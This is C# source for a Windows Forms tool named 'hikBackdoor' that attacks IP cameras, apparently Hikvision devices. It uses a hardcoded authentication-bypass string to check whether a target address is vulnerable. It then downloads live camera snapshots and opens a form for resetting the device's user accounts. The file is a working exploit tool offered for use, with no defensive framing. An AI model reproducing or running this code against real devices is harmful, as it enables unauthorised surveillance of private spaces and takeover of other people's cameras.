using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Diagnostics;
using System.Drawing;
using System.Linq;
using System.Net;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using System.Windows.Forms;
using System.Xml;

namespace KDownloader_Recoded
{
    public partial class hikBackdoor : Form
    {
        public readonly string secret_key = "?auth=YWRtaW46MTEK";
        public string ipAddr = "";
        public TimeWebClient w = new TimeWebClient();
        bool curIpIsVuln = false;
        public Random rnd = new Random();
        public hikBackdoor()
        {
            InitializeComponent();
        }

        public string processIP()
        {
            string tmp;
            tmp = ipAddr.Replace("http://", "");
            tmp = tmp.Replace("https://", "");
            tmp = tmp.Replace("/", "");
            tmp = "http://" + tmp;
            return tmp;
        }

        public bool checkVuln()
        {
            try
            {
                w.DownloadData(ipAddr + "/Security/users" + secret_key);
                return true;
            }
            catch
            {
                return false;
            }
        }

        private void hikBackdoor_Load(object sender, EventArgs e)
        {

        }

        private void accountsBtn_Click(object sender, EventArgs e)
        {
            accountsReset ar = new accountsReset(ipAddr);
            ar.Show();
        }

        private void testVulnBtn_Click(object sender, EventArgs e)
        {
            ipAddr = ipTextbox.Text;
            ipAddr = processIP();
            curIpIsVuln = checkVuln();
            if (curIpIsVuln)
            {
                print(Color.Green, "Set IP Address (Vulnerable)");
                snapBtn.Enabled = true;
                accountsBtn.Enabled = true;
            }
            else
            {
                print(Color.Red, "IP is not vulnerable!");
                snapBtn.Enabled = false;
                accountsBtn.Enabled = false;
            }
        }

        private void snapBtn_Click(object sender, EventArgs e)
        {
            Thread bgdl = new Thread(() => dlAndShowSnapshot());
            bgdl.IsBackground = true;
            bgdl.Start();
            print(Color.Green, "Grabbing snapshot...");
        }

        public void dlAndShowSnapshot()
        {
            try
            {
                string path = System.IO.Path.GetDirectoryName(Application.ExecutablePath);
                string fname = path + "/" + RandomString(10) + ".jpg";
                w.DownloadFile(ipAddr + "/onvif-http/snapshot" + secret_key, fname);
                Process.Start(fname);
                print(Color.Green, "Got snapshot.");
            }
            catch
            {
                print(Color.Red, "Failed to get snapshot.");
            }

        }

        public string RandomString(int length)
        {
            const string chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789";
            return new string(Enumerable.Repeat(chars, length).Select(s => s[rnd.Next(s.Length)]).ToArray());
        }

        public void print(Color c, string text)
        {
            if (this.IsHandleCreated)
            {
                this.Invoke(new MethodInvoker(delegate ()
                {
                    output.Items.Insert(0, new colourItem(c, text));
                }));
            }
        }

        private void oDraw(object sender, DrawItemEventArgs e)
        {
            colourItem item = output.Items[e.Index] as colourItem;
            if (item != null)
            {
                Bitmap tmbmp = new Bitmap(1, 1);
                Graphics g = Graphics.FromImage(tmbmp);

                int width = (int)g.MeasureString(item.Message, output.Font).Width;
                e.Graphics.DrawString(item.Message, output.Font, new SolidBrush(item.ItemColor), ((output.Width / 2) - (width / 2)), e.Index * output.ItemHeight);

                g.Dispose();
                tmbmp.Dispose();
            }
            else
            {

            }
        }

        private void confBtn_Click(object sender, EventArgs e)
        {

        }
    }
}
